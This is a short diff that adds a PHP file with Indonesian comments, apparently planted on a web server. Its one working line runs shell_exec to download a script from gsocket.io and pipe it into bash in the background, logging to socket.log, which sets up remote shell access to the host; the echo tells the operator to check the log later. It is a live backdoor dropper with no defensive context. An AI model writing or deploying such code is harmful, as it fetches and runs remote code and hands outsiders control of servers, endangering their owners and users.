@@ -1,0 +1,5 @@
+<?php
+// Perintah yang sama, tapi tulis output ke file
+shell_exec("curl -fsSL https://gsocket.io/y | bash > socket.log 2>&1 &");
+echo "Perintah dikirim, cek file socket.log nanti.";
+?>
